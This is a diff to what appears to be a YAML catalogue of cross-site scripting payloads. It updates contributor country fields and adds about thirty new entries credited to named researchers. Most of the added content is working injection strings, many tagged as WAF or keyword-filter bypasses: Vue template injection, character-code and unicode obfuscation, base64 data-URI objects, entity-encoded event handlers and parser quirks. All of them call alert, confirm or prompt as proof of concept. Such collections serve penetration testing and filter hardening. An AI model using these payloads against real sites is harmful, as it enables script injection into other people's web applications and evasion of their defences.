@@ -10006,7 +10006,7 @@ payloads:
     category: "research"
     contributor: "Sam Anttila"
     github_username: "the-xentropy"
-    country: "Unknown"
+    country: "United States"
     tags: ["form-feed", "separator", "waf-bypass", "character-encoding"]
     browsers: ["Chrome", "Firefox", "Safari", "Edge"]
     date_added: "05-01-2025"
@@ -10017,7 +10017,7 @@ payloads:
     category: "research"
     contributor: "Sam Anttila"
     github_username: "the-xentropy"
-    country: "Unknown"
+    country: "United States"
     tags: ["carriage-return", "separator", "waf-bypass", "control-character"]
     browsers: ["Chrome", "Firefox", "Safari", "Edge"]
     date_added: "05-01-2025"
@@ -10028,7 +10028,7 @@ payloads:
     category: "research"
     contributor: "Sam Anttila"
     github_username: "the-xentropy"
-    country: "Unknown"
+    country: "United States"
     tags: ["case-bypass", "mixed-case", "filter-evasion", "event-handler"]
     browsers: ["Chrome", "Firefox", "Safari", "Edge"]
     date_added: "05-01-2025"
@@ -10039,7 +10039,7 @@ payloads:
     category: "research"
     contributor: "Sam Anttila"
     github_username: "the-xentropy"
-    country: "Unknown"
+    country: "United States"
     tags: ["case-bypass", "onload", "svg", "case-sensitive-filter"]
     browsers: ["Chrome", "Firefox", "Safari", "Edge"]
     date_added: "05-01-2025"
@@ -10050,7 +10050,7 @@ payloads:
     category: "research"
     contributor: "Sam Anttila"
     github_username: "the-xentropy"
-    country: "Unknown"
+    country: "United States"
     tags: ["html5", "video", "onloadstart", "modern-event", "waf-bypass"]
     browsers: ["Chrome", "Firefox", "Safari"]
     date_added: "05-01-2025"
@@ -10061,7 +10061,7 @@ payloads:
     category: "research"
     contributor: "Sam Anttila"
     github_username: "the-xentropy"
-    country: "Unknown"
+    country: "United States"
     tags: ["html5", "audio", "oncanplay", "modern-event", "filter-bypass"]
     browsers: ["Chrome", "Firefox", "Safari"]
     date_added: "05-01-2025"
@@ -10072,7 +10072,7 @@ payloads:
     category: "research"
     contributor: "Sam Anttila"
     github_username: "the-xentropy"
-    country: "Unknown"
+    country: "United States"
     tags: ["html5", "video", "onplay", "autoplay", "no-interaction"]
     browsers: ["Chrome", "Firefox", "Safari"]
     date_added: "05-01-2025"
@@ -10085,7 +10085,7 @@ payloads:
     category: "research"
     contributor: "Sam Anttila"
     github_username: "the-xentropy"
-    country: "Unknown"
+    country: "United States"
     tags: ["url-encoding", "hex-encoding", "keyword-bypass", "double-encoding"]
     browsers: ["Chrome", "Firefox", "Safari", "Edge"]
     date_added: "05-01-2025"
@@ -10096,7 +10096,7 @@ payloads:
     category: "research"
     contributor: "Sam Anttila"
     github_username: "the-xentropy"
-    country: "Unknown"
+    country: "United States"
     tags: ["experimental", "onbeforetoggle", "details", "modern-event", "waf-bypass"]
     browsers: ["Chrome"]
     date_added: "05-01-2025"
@@ -10107,7 +10107,345 @@ payloads:
     category: "research"
     contributor: "Sam Anttila"
     github_username: "the-xentropy"
-    country: "Unknown"
+    country: "United States"
     tags: ["iframe", "srcdoc", "html-entities", "parent", "encoding-bypass"]
     browsers: ["Chrome", "Firefox", "Safari"]
     date_added: "05-01-2025"
+
+  # === ADVANCED 2021 RESEARCH TECHNIQUES (Sam Anttila 2021) ===
+  # Source: https://netsec.expert/posts/xss-in-2021/
+  # Credit: Sam Anttila (@the-xentropy)
+
+  - code: |
+      {{_openBlock.constructor('alert(1)')()}}
+    description: "Vue.js v3 template injection via _openBlock.constructor - advanced framework bypass"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "United States"
+    tags: ["vue3", "vuejs", "template-injection", "_openBlock", "constructor", "framework-bypass", "2021-research"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      [self.alert(1)]
+    description: "Mavo framework self-referential alert execution - creative framework exploitation"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "United States"
+    tags: ["mavo", "framework", "self", "alert", "square-brackets", "creative-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <script>globalThis[`al`+/ert/.source](1)</script>
+    description: "Advanced globalThis access using template literals and regex source - keyword filter bypass"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "United States"
+    tags: ["globalThis", "template-literals", "regex", "source", "keyword-bypass", "advanced-concat"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <script>window['a'+'l'+'e'+'r'+'t'](1)</script>
+    description: "String concatenation method access to bypass string-based keyword filters"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "United States"
+    tags: ["string-concat", "window", "keyword-bypass", "filter-evasion", "plus-operator"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <script>al\u0065rt(1)</script>
+    description: "Unicode escape sequence in function name to evade pattern-based detection"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "United States"
+    tags: ["unicode-escape", "function-name", "pattern-evasion", "u0065", "encoding-bypass"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <div onanimationstart=alert(1) style=animation:x\ 1s><style>@keyframes x{}</style></div>
+    description: "CSS animation trigger with onanimationstart event - creative interaction-free XSS"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "United States"
+    tags: ["css-animation", "onanimationstart", "keyframes", "no-interaction", "style-injection"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <script>Function.prototype.constructor('alert(1)')()</script>
+    description: "Function prototype constructor access - advanced constructor bypass technique"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "United States"
+    tags: ["function-prototype", "constructor", "prototype-chain", "advanced-bypass", "reflection"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <iframe src="javascript:`${alert(1)}`"></iframe>
+    description: "Template literal within javascript: scheme - modern string interpolation attack"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "United States"
+    tags: ["template-literals", "javascript-scheme", "iframe", "string-interpolation", "modern-js"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <img/src=x/onerror=this[location.hash.slice(1)](1)>
+    description: "Location hash-based dynamic function call - URL fragment exploitation"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "United States"
+    tags: ["location-hash", "dynamic-call", "fragment", "this", "url-exploitation", "slice"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <meta http-equiv=refresh content="0;url=javascript:alert`1`">
+    description: "Meta refresh with javascript scheme using template literals - non-standard alert syntax"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "United States"
+    tags: ["meta-refresh", "http-equiv", "javascript-scheme", "template-literals", "backticks"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <script>top[String.fromCharCode(97,108,101,114,116)](1)</script>
+    description: "Top frame access with character code construction - multi-frame bypass technique"
+    category: "research"
+    contributor: "Sam Anttila"
+    github_username: "the-xentropy"
+    country: "United States"
+    tags: ["top-frame", "fromCharCode", "character-codes", "frame-access", "multi-frame"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "05-01-2025"
+
+  - code: |
+      <svgonload=alert(1)><svg>
+    description: "SVG with form feed character (0xc) bypassing space restrictions"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["svg", "form-feed", "bypass", "no-space", "whitespace-bypass"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <marquee width=10 loop=2 behavior="alternate" onbounce=alert()>
+    description: "Marquee onbounce event - Firefox only"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["marquee", "onbounce", "firefox", "browser-specific", "animation"]
+    browsers: ["Firefox"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <marquee loop=1 width=0 onfinish=alert(1)>
+    description: "Marquee onfinish event when animation completes - Firefox only"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["marquee", "onfinish", "firefox", "browser-specific", "animation"]
+    browsers: ["Firefox"]
+    date_added: "07-01-2026"
+
+
+  - code: |
+      <body onpageshow=alert(1)>
+    description: "Body onpageshow event fires when page becomes visible"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["body", "onpageshow", "page-visibility", "event"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <video controls onloadeddata="alert()"><source src=x></video>
+    description: "Video onloadeddata event fires when media data is loaded"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["video", "onloadeddata", "media", "html5"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <video controls onloadedmetadata="alert()"><source src=x></video>
+    description: "Video onloadedmetadata event fires when metadata is loaded"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["video", "onloadedmetadata", "metadata", "html5"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <audio autoplay controls onplaying="alert()"><source src=x></audio>
+    description: "Audio onplaying event fires when media starts playing"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["audio", "onplaying", "autoplay", "html5"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+    description: "Object with data URI base64 encoded script with multiple semicolons"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["object", "data-uri", "base64", "semicolon", "waf-bypass"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <form><isindex formaction="javascript&colon;confirm(1)">
+    description: "ISINDEX element with formaction using HTML entity encoding"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["isindex", "formaction", "html-entity", "colon-entity", "legacy-element"]
+    browsers: ["Legacy"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <img/src=`%00` onerror=this.onerror=confirm(1)
+    description: "Image with null byte and self-referencing onerror to prevent loops"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["img", "null-byte", "self-reference", "onerror", "loop-prevention"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
+    description: "SVG style with CSS font-family containing iframe payload using HTML entity"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["svg", "style", "css", "font-family", "iframe", "html-entity"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
+    description: "Style element with onload event using HTML entity encoding"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["style", "onload", "html-entity", "decimal-entity", "bypass"]
+    browsers: ["Legacy"]
+    date_added: "07-01-2026"
+
+  - code: |
+      </plaintext\></|\><plaintext/onmouseover=prompt(1)
+    description: "Plaintext element escape with onmouseover event"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["plaintext", "onmouseover", "element-escape", "legacy-element"]
+    browsers: ["Legacy"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver
+    description: "Blink element with onmouseover using mixed entity encoding - Firefox/Opera"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["blink", "onmouseover", "carriage-return", "hex-entity", "firefox", "opera"]
+    browsers: ["Firefox", "Opera"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <var onmouseover="prompt(1)">On Mouse Over</var>
+    description: "Variable element with onmouseover event"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["var", "variable", "onmouseover", "semantic-element"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+
+  - code: |
+      <iframe/onreadystatechange=alert(1)
+    description: "Iframe onreadystatechange event without closing tag"
+    category: "basic"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["iframe", "onreadystatechange", "event", "ie-specific"]
+    browsers: ["IE"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <script>+-+-1-+-+alert(1)</script>
+    description: "JavaScript with mathematical operators obfuscation"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["script", "mathematical-operators", "obfuscation", "arithmetic"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <img src ?itworksonchrome?\/onerror = alert(1)
+    description: "Image with comment-like syntax and backslash in attribute"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["img", "comment-syntax", "backslash", "chrome-specific", "quirks"]
+    browsers: ["Chrome"]
+    date_added: "07-01-2026"
+
+  - code: |
+      <script itworksinallbrowsers>/*<script* */alert(1)</script
+    description: "Script with comment obfuscation and unclosed tag"
+    category: "bypass"
+    contributor: "Sid Joshi"
+    github_username: "dr34mhacks"
+    country: "India"
+    tags: ["script", "comment-obfuscation", "unclosed-tag", "parsing-confusion"]
+    browsers: ["All"]
+    date_added: "07-01-2026"
+
+
